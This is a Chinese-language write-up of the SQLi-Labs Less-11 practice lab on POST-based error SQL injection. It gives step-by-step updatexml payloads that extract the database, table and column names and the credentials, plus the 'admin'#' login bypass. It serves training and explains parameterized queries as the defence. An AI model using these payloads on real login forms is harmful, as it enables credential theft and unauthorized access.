SQLi-Labs Less-11

2026年9月26日 SQLi-Labs Web安全 SQL注入 POST报错注入

一、题目信息

  • 题目名称：SQLi-Labs Less-11 (POST - Error Based - Single quotes- String)
  • 题目平台：SQLi-Labs 本地靶场
  • 题目类型：Web安全 / SQL注入 / POST型报错注入
  • 靶场链接：http://localhost:8081/Less-11/（本地环境）
  • 涉及工具：Chrome浏览器 (F12开发者工具 / HackBar)

二、解题步骤

1. 分析题目考什么

本题的核心考点是基于 POST 请求的报错注入（Error-Based SQL Injection）。与之前 GET 请求的关卡不同，Less-11 将参数提交方式变为了 POST（登录框表单），因此不能直接在 URL 中拼接 payload，必须使用抓包工具或浏览器 F12 拦截并修改请求体。后端 SQL 语句使用单引号（'）包裹变量，由于没有屏蔽数据库报错信息，我们可以利用报错函数（如 updatexml）将查询结果直接回显在页面上。

2. 怎么想（破题思路）

  • 在 Username 输入 admin'，Password 随便填，点击提交。观察页面是否抛出 SQL 语法错误，以判断闭合方式。
  • 确认存在单引号报错注入后，利用 updatexml 或 extractvalue 函数，构造 payload 将数据库名、表名、字段名和具体数据带入报错信息中。
  • 由于是 POST 请求，利用浏览器 F12 的 Network 面板或者 HackBar 插件来发送 payload。
  • 最终的测试目的是“登录成功”，因此也可以尝试利用逻辑漏洞（万能密码）直接绕过验证。

3. 怎么解（详细步骤与踩坑记录）

踩坑记录一：POST传参无法在URL注入

踩坑情况：一开始习惯性在 URL 中写 ?id=admin'，发现毫无反应。

原因分析：Less-11 是通过表单 POST 提交数据到后端 PHP，URL 里的参数不会被后端接收。

改进方式：打开浏览器 F12（开发者工具） -> Network（网络） -> 勾选 Preserve log，点击 Submit 抓取请求，在 Payload 或 Form Data 中修改 Username 和 Password 的值。

踩坑记录二：查表名时出现字符集排序冲突报错

踩坑情况：输入 admin' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 0,1),0x7e),1)# 时，页面报错：Illegal mix of collations (gbk_chinese_ci,IMPLICIT) and (latin1_swedish_ci,COERCIBLE) for operation '='。

原因分析：MySQL 系统自带的 information_schema 库默认字符集是 gbk，而靶场数据库是 latin1。当两者进行比较（table_schema='security'）时，发生了字符集冲突。

改进方式：把字符串硬编码改为十六进制形式，或者使用 database() 函数替代 'security'。例如写 table_name=0x7573657273（0x 是十六进制前缀，7573657273 是 users 的十六进制编码），这样就能完美绕过字符集冲突。

踩坑记录三：updatexml 回显长度截断问题

踩坑情况：查密码时，页面报错显示 XPATH syntax error: '~admin~' 或者直接变成了 XPATH syntax error: '~'。

原因分析：updatexml 报错回显的最大限制是 32 个字符。密码的 MD5 值刚好 32 位，加上边界符号 ~ 会导致超长截断，或者查询到了空白数据。

改进方式：使用 substr() 函数分段截取。例如 substr((select password from users limit 0,1),1,30) 截取前 30 位，再 substr(...,31,32) 截取后 2 位，拼接即可。或者干脆使用偷懒终极方法：万能密码登录。

详细实操步骤（Payload逐字解释）

第一步：判断闭合方式

Username 输入 admin'，Password 输入 123。页面报错 You have an error in your SQL syntax... near '123' LIMIT 0,1'。说明后端语句是 SELECT * FROM users WHERE username='$username' AND password='$password' LIMIT 0,1;，我们的单引号提前闭合了 username 字段。

第二步：获取数据库名

admin' and updatexml(1,concat(0x7e,(select database()),0x7e),1)#

逐字解析：

  • admin'：闭合原有的 username 单引号。
  • and：逻辑与，必须前后都为真才会执行。
  • updatexml(1, XPath格式字符串, 1)：这是一个操作 XML 数据的函数。当第二个参数不符合 XPath 语法规范时，MySQL 就会报错并抛出这个字符串。我们正是利用这一点，把查到的数据放到第二个参数里让系统报错抛出。
  • concat(0x7e, (select database()), 0x7e)：concat 拼接字符串。0x7e 是十六进制，代表波浪号 ~，用作回显时的边界，方便一眼看出数据。中间的 (select database()) 是子查询，获取当前库名。
  • #：MySQL 的注释符，把后面的原 SQL 语句（如 ' AND password='...' LIMIT 0,1;）全部注释掉，保持语法正确。

回显：XPATH syntax error: '~security~'，成功拿到数据库名！

第三步：获取表名

admin' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)#

逐字解析：（重点解释新名词）

  • information_schema.tables：information_schema 是 MySQL 自带的信息数据库，里面存着所有表、列的信息。.tables 代表查它里面的表记录。
  • where table_schema=database()：过滤条件，只查当前数据库（security）的表。
  • limit 0,1：限制输出。0 表示从第 1 条开始，1 表示取 1 条。如果查第二个表，改成 limit 1,1。

回显 ~emails~，改为 limit 1,1 回显 ~users~（直接锁定 users 表）。

第四步：获取字段名

admin' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1),0x7e),1)#

把 tables 换成 columns，加入 table_name='users'。依次把 limit 0,1 改为 1,1，拿到字段名：id、username、password。

第五步：获取数据与通关

-- 拿用户名
admin' and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)#
-- 拿密码（分段截取防截断）
admin' and updatexml(1,concat(0x7e,substr((select password from users limit 0,1),1,30)),1)#

成功拿到 admin / admin 或者 Dumb / Dumb。最后回到登录框，Username 填 admin，Password 填 admin，成功登录。

终极逃课法（万能密码）：直接在 Username 输入 admin'#，Password 随便填，点击 Submit。因为 # 把后面的密码验证全注释了，SQL 变成 SELECT * FROM users WHERE username='admin'#，直接登录成功。

4. 怎么迁移（跨领域联想）

  • 测试与质控（QA）：抓包修改 POST 参数是软件测试工程师的基础技能，测试接口健壮性时，常通过篡改参数来验证后端防御能力，这与我们使用 F12 修改 Form Data 原理完全一致。
  • 数据库运维：我们遇到的字符集冲突（GBK vs Latin1）在企业数据迁移、多语言系统对接中极其常见。了解底层的字符集编码，能帮助运维人员快速定位乱码和排序异常问题。
  • 逻辑漏洞思维：“万能密码”本质不是数据库漏洞，而是后端的逻辑漏洞。因为在开发中，未经验证的用户输入被拼接，且注释符能够截断后续的验证逻辑。这提醒我们在代码审计时，要密切关注任何拼接字符串的地方。

三、名词大全与原理深度复盘

1. POST 注入

数据通过 HTTP 请求体（Request Body）发送，而不是 URL 参数。一般出现在登录框、搜索框、留言板等需要提交表单的地方。

2. 报错注入（Error-Based）

开发者没有关闭 PHP 的报错回显（如 display_errors = On）。攻击者利用数据库执行错误时抛出的信息，将想要查询的数据通过非法格式（如调用 updatexml）拼接在错误信息中带出来。是一种非常高效的数据回显方式。

3. updatexml() 函数原理深度复盘

updatexml(XML_document, XPath_string, new_value) 是 MySQL 用于更新 XML 文档节点的函数。它的第二个参数必须是合法的 XPath 格式。当传入类似 ~security~ 的字符串时，MySQL 发现这不是 XPath 语法，就会抛出错误：XPATH syntax error: '~security~'，从而暴露数据。回显上限为 32 字节。

4. 字符集排序（Collation）冲突

MySQL 为了比较字符串大小，使用 Collation 规则。比如 gbk_chinese_ci（不区分大小写的中文编码）和 latin1_swedish_ci（不区分大小写的拉丁编码）在比较时会冲突。解决方法是转换为十六进制或使用 database() 保持上下文一致。

5. 注释符（# 与 -- ）

# 在 MySQL 中代表注释，在 POST 传参时可能被当成锚点或被浏览器过滤，通常需要 URL 编码为 %23。如果 # 失效，可以使用 -- （减号减号空格）来注释。

四、题目思考

1. 这跟前面的题有什么区别？

  • 与 Less-1~10 的区别：Less-1 到 Less-10 都是 GET 请求（参数在 URL 中）。Less-11 是 POST 请求（参数在请求体中）。GET 的参数可以直接在地址栏改，而 POST 必须抓包。此外，Less-8 和 Less-10 属于盲注（没有回显，靠猜），Less-11 是报错注入（直接把数据报错输出），难度反而降低了。
  • 与 Less-12 的区别：Less-11 使用单引号闭合（'），而 Less-12 使用双引号加括号闭合（")，后续逻辑完全一致。

2. 这种题目的出现原因（为什么存在）

从上世纪 90 年代 Web 技术诞生起，开发者习惯于将用户输入直接拼接成 SQL 语句执行（如直接写 "SELECT * FROM users WHERE username='" + userInput + "'"）。这就好比服务员不问顾客想吃什么，而是把顾客说的话直接当成厨房指令。如果顾客说“给我上一碗面，顺便把这个厨房炸了”，厨房就会照做。这就是 SQL 注入的历史原因。防御方法就是使用“参数化查询”，把代码和数据严格分开。

3. 这种应用在实际中如何体现？

在实际的红蓝对抗中，后台登录框、API 接口是报错注入的重灾区。渗透测试人员通过报错注入可以快速获取数据库权限，进而读取管理员账号密码，甚至写入 WebShell 控制服务器。同时，如果报错注入被修复，攻击者就会顺延到盲注（布尔盲注、时间盲注）来继续攻击。

4. 如何抽象理解概念（大白话）

把数据库比作一个“诚实的图书馆管理员”：

  • 你问他：“有《张三》这本书吗？”（正常输入）他会回答：“有”或“没有”。
  • 你输入：张三' 并且大声朗读一下图书馆的管理员密码 #
  • 因为管理员处理语言系统有 Bug（没有区分你是提问还是下命令），他听到前面的单引号后，以为这句话结束了，后面的“并且大声朗读管理员密码”变成了新命令，于是他真的把密码念了出来（这就是报错回显）。
  • 最后的 # 就像是一块橡皮擦，把后面没用的废话全部擦除，保证他的命令还能顺利执行完（防止语法报错中断执行）。
